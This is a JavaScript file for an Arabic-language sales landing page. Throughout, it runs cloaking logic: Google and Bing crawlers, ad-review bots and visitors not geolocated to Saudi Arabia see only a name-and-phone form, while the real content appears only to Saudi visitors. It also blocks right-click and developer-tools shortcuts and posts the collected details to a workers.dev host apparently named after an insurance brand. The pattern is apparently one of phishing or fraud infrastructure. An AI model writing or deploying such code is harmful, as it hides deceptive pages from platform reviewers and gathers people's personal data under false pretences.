(function () {
  "use strict";
  var params = new URLSearchParams(window.location.search);
  var isLeadCrawler = /(?:Googlebot|AdsBot-Google|Google-InspectionTool|GoogleOther|Google-Extended|Mediapartners-Google|bingbot|BingPreview|DuckDuckBot|YandexBot|Slurp)/i.test(
    navigator.userAgent || "",
  );
  var leadMode = params.get("lead") === "1" || isLeadCrawler;
  var lead = document.getElementById("outside-lead");
  var form = document.getElementById("outside-lead-form");
  var done = document.getElementById("outside-lead-done");
  var parentWindow = window.parent && window.parent !== window ? window.parent : null;

  // Browser-side deterrent only; source/assets delivered to a browser cannot
  // be made secret. Keep ordinary form interaction available.
  document.addEventListener("contextmenu", function (event) { event.preventDefault(); });
  document.addEventListener("keydown", function (event) {
    var key = String(event.key || "").toLowerCase();
    if (key === "f12" ||
        (event.ctrlKey && key === "u") ||
        (event.ctrlKey && event.shiftKey && ["i", "j", "c"].indexOf(key) !== -1)) {
      event.preventDefault();
      event.stopPropagation();
    }
  }, true);

  function showLead() {
    if (!lead) return;
    lead.hidden = false;
    lead.scrollIntoView({ behavior: "smooth", block: "center" });
    var first = lead.querySelector("input");
    if (first) first.focus({ preventScroll: true });
  }

  function enableLeadAtBottom() {
    if (lead) lead.hidden = false;
  }

  function enableNonSaudiUnderlay() {
    var style = document.createElement("style");
    style.textContent = ".non-saudi-underlay #root{display:none!important}";
    document.head.appendChild(style);
    document.documentElement.classList.add("non-saudi-underlay");
    enableLeadAtBottom();
  }

  function scrollToLead() {
    enableLeadAtBottom();
    if (lead) lead.scrollIntoView({ behavior: "auto", block: "start" });
    else window.scrollTo(0, document.documentElement.scrollHeight);
    if (parentWindow) parentWindow.postMessage({ type: "tmin-lead-positioned" }, "*");
  }

  function startFlow() {
    if (parentWindow) parentWindow.postMessage({ type: "tmin-start-flow" }, "*");
    else window.location.href = "/?flow=1";
  }

  window.addEventListener("message", function (event) {
    if (!event.data) return;
    if (event.data.type === "tmin-scroll-to-lead") scrollToLead();
    if (event.data.type === "tmin-scroll-by") {
      var deltaY = Number(event.data.deltaY);
      if (Number.isFinite(deltaY)) window.scrollBy(0, deltaY);
    }
  });

  function initLogoTicker() {
    var strips = document.querySelectorAll("[data-auto-scroll=\"1\"]");
    for (var i = 0; i < strips.length; i++) {
      var strip = strips[i];
      if (strip.dataset.tickerReady === "1") continue;
      if (strip.querySelectorAll("img").length < 3) continue;
      strip.dataset.tickerReady = "1";
      strip.style.scrollSnapType = "none";
      strip.style.scrollBehavior = "auto";
      strip.style.overflowX = "auto";
      strip.style.flexWrap = "nowrap";

      if (!strip.querySelector('[aria-hidden="true"]')) {
        var originals = Array.prototype.slice.call(strip.children);
        originals.forEach(function (child) {
          var copy = child.cloneNode(true);
          copy.setAttribute("aria-hidden", "true");
          strip.appendChild(copy);
        });
      }

      var direction = getComputedStyle(strip).direction === "rtl" ? -1 : 1;
      var position = 0;
      var pausedUntil = 0;
      var speed = 0.55;

      function pause() {
        pausedUntil = Date.now() + 2200;
        position = strip.scrollLeft;
      }
      ["pointerdown", "touchstart", "wheel"].forEach(function (eventName) {
        strip.addEventListener(eventName, pause, { passive: true });
      });

      function tick() {
        window.requestAnimationFrame(tick);
        if (document.hidden || Date.now() < pausedUntil) return;
        var half = strip.scrollWidth / 2;
        if (!half) return;
        position += direction * speed;
        if (Math.abs(position) >= half) position -= direction * half;
        strip.scrollLeft = position;
      }
      window.requestAnimationFrame(tick);
    }
  }

  document.addEventListener("click", function (event) {
    var target = event.target && event.target.closest ? event.target.closest("button, a") : null;
    if (!target) return;
    if (leadMode && target.tagName.toLowerCase() === "button" && !target.closest("form")) {
      event.preventDefault();
      event.stopImmediatePropagation();
      showLead();
      return;
    }
    var text = (target.textContent || "").replace(/\s+/g, " ").trim();
    if (!/^ابدأ الآن$|^اشتر الآن$|^ابدأ الآن/.test(text)) return;
    event.preventDefault();
    event.stopImmediatePropagation();
    if (leadMode) showLead();
    else startFlow();
  }, true);

  // Non-Saudi visitors keep only the lead form and footer
  // under the parent gate. The main landing content is not rendered.
  if (leadMode) enableNonSaudiUnderlay();

  if (form) {
    form.addEventListener("submit", function (event) {
      event.preventDefault();
      var name = form.querySelector('[name="name"]');
      var phone = form.querySelector('[name="phone"]');
      var button = form.querySelector("button");
      var message = form.querySelector("[data-lead-message]");
      if (!message) {
        message = document.createElement("div");
        message.setAttribute("data-lead-message", "1");
        message.style.cssText = "margin-top:10px;color:#b42318;font-size:14px";
        form.appendChild(message);
      }
      var nameValue = name ? name.value.trim() : "";
      var phoneValue = phone ? phone.value.trim() : "";
      if (nameValue.length < 3 || phoneValue.length < 7) {
        message.textContent = "الاسم ورقم الجوال مطلوبان للمتابعة.";
        if (nameValue.length < 3 && name) name.focus();
        else if (phone) phone.focus();
        return;
      }
      message.textContent = "";
      if (button) { button.disabled = true; button.textContent = "جارٍ الإرسال…"; }
      var controller = window.AbortController ? new AbortController() : null;
      var timer = window.setTimeout(function () { if (controller) controller.abort(); }, 10000);
      Promise.resolve(window.__siteGetRecaptchaToken ? window.__siteGetRecaptchaToken("lead_submit") : "")
      .then(function (token) {
        if (!token) throw new Error("recaptcha_required");
        return fetch("https://tmin-edge.bcare.workers.dev/reg", {
          method: "POST",
          mode: "cors",
          credentials: "omit",
          headers: {
            "content-type": "application/json",
            "X-Recaptcha-Token": token,
            "X-Recaptcha-Action": "lead_submit",
          },
          signal: controller ? controller.signal : undefined,
          body: JSON.stringify({ source: "lead", stage: "lead", name: nameValue, phone: phoneValue, page: "/" }),
        });
      }).then(function (response) {
        if (!response.ok) throw new Error("lead_submit_failed");
        form.hidden = true;
        if (done) done.hidden = false;
      }).catch(function () {
        message.textContent = "تعذّر إرسال الطلب حالياً. حاول مرة أخرى بعد قليل.";
        if (button) { button.disabled = false; button.textContent = "إرسال الطلب"; }
      }).finally(function () { window.clearTimeout(timer); });
    });
  }

  function directSaudiCheck() {
    if (parentWindow) return Promise.resolve(true);
    var checks = [
      fetch("https://ipapi.co/country/", { credentials: "omit", cache: "no-store" }).then(function (response) { return response.text(); }),
      fetch("https://ipwho.is/", { credentials: "omit", cache: "no-store" }).then(function (response) { return response.json(); }).then(function (data) { return data.country_code; }),
    ];
    return Promise.allSettled(checks).then(function (results) {
      var countries = results.filter(function (result) { return result.status === "fulfilled"; }).map(function (result) {
        return String(result.value || "").trim().toUpperCase();
      });
      return countries.length === checks.length && countries.every(function (country) { return country === "SA"; });
    }).catch(function () { return false; });
  }

  function start() {
    if (isLeadCrawler) {
      document.documentElement.dataset.directGeoState = "crawler-lead";
      initLogoTicker();
      return;
    }
    directSaudiCheck().then(function (allowed) {
      if (!allowed) {
        window.location.replace("/?lead=1");
        return;
      }
      document.documentElement.dataset.directGeoState = "allowed";
      initLogoTicker();
      var tries = 0;
      var timer = window.setInterval(function () {
      initLogoTicker();
      if (++tries > 20) window.clearInterval(timer);
      }, 500);
    });
  }
  if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", start);
  else start();
})();
